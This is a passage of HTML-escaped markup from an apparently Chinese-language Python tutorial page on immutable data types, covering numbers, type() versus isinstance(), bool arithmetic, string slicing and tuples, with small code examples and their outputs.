a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;不可变数据&#34;&gt;&lt;a href=&#34;#不可变数据&#34; class=&#34;headerlink&#34; title=&#34;不可变数据&#34;&gt;&lt;/a&gt;不可变数据&lt;/h3&gt;&lt;h4 id=&#34;Number-数字&#34;&gt;&lt;a href=&#34;#Number-数字&#34; class=&#34;headerlink&#34; title=&#34;Number(数字)&#34;&gt;&lt;/a&gt;Number(数字)&lt;/h4&gt;&lt;p&gt;支持int、float、bool、complex（复数）&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5.5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3j&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
&amp;lt;class &#39;int&#39;&amp;gt; &amp;lt;class &#39;float&#39;&amp;gt; &amp;lt;class &#39;bool&#39;&amp;gt; &amp;lt;class &#39;complex&#39;&amp;gt;
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;type()&lt;/code&gt;函数查询变量的类型&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;111&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;isinstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
True
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;isinstance(x,x)&lt;/code&gt;对比对象类型&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;type()&lt;/code&gt;不会认为子类是一种父类类型&lt;/li&gt;
&lt;li&gt;&lt;code&gt;isinstance()&lt;/code&gt;会认为子类是一种父类类型&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;pass&lt;/span&gt;


&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;isinstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;A&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;isinstance&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;B&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;B&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; A&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
True
True
True
False
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;bool值处理&#34;&gt;&lt;a href=&#34;#bool值处理&#34; class=&#34;headerlink&#34; title=&#34;bool值处理&#34;&gt;&lt;/a&gt;bool值处理&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;issubclass&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Ture&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
var1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var1 &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;
var2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var2 &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
True
True
True
2
1
False
False
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;删除对象&#34;&gt;&lt;a href=&#34;#删除对象&#34; class=&#34;headerlink&#34; title=&#34;删除对象&#34;&gt;&lt;/a&gt;删除对象&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; a
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; var1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;var2

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
再次print会报错
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;数值运算&#34;&gt;&lt;a href=&#34;#数值运算&#34; class=&#34;headerlink&#34; title=&#34;数值运算&#34;&gt;&lt;/a&gt;数值运算&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;除法&lt;code&gt;/&lt;/code&gt;返回一个浮点数，&lt;code&gt;//&lt;/code&gt;返回一个整数&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*&lt;/code&gt;乘法，&lt;code&gt;**&lt;/code&gt;乘方&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%&lt;/code&gt;取余&lt;/li&gt;
&lt;li&gt;混合运算时整型转换为浮点型&lt;/li&gt;
&lt;li&gt;复数使用&lt;code&gt;complex(a,b)&lt;/code&gt;表示&lt;code&gt;a+bj&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;String-字符串&#34;&gt;&lt;a href=&#34;#String-字符串&#34; class=&#34;headerlink&#34; title=&#34;String(字符串)&#34;&gt;&lt;/a&gt;String(字符串)&lt;/h4&gt;&lt;h5 id=&#34;字符串截取格式&#34;&gt;&lt;a href=&#34;#字符串截取格式&#34; class=&#34;headerlink&#34; title=&#34;字符串截取格式&#34;&gt;&lt;/a&gt;字符串截取格式&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;变量名&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;头下标&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;尾下标&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从前面索引  0 1 2 3 4 ……&lt;/p&gt;
&lt;p&gt;从后面索引  -1 -2 -3 -4 -5 ……&lt;/p&gt;
&lt;p&gt;从前面截取 :1 2 3 4:&lt;/p&gt;
&lt;p&gt;从后面截取 :-4 -3 -2 -1:&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# t&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有字符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出第一个到倒数第二个&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# tes&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;# 输出第三个到第四个&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# st&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# testtest&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;re&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# testre&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# t t&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test
t
test
tes
st
testtest
testre
t t
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;python字符串不能改变，诸如&lt;code&gt;str[n]=&#39;?&#39;&lt;/code&gt;的赋值会报错&lt;/p&gt;
&lt;h4 id=&#34;Tuple-元组&#34;&gt;&lt;a href=&#34;#Tuple-元组&#34; class=&#34;headerlink&#34; title=&#34;Tuple(元组)&#34;&gt;&lt;/a&gt;Tuple(元组)&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;元组元素不能更改&lt;/li&gt;
&lt;li&gt;元组写在小括号内，以&lt;code&gt;,&lt;/code&gt;分隔&lt;/li&gt;
&lt;li&gt;各元素类型可以不同&lt;/li&gt;
&lt;li&gt;元组的索引切片操作与string一样&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dou&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
tuple2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
tuple3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 单个元素后面加逗号&lt;/span&gt;
tuple4 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 空元组&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ()&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1, 1.2, &#39;test&#39;, &#39;dou&#39;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# (1,)&lt;/span&gt;
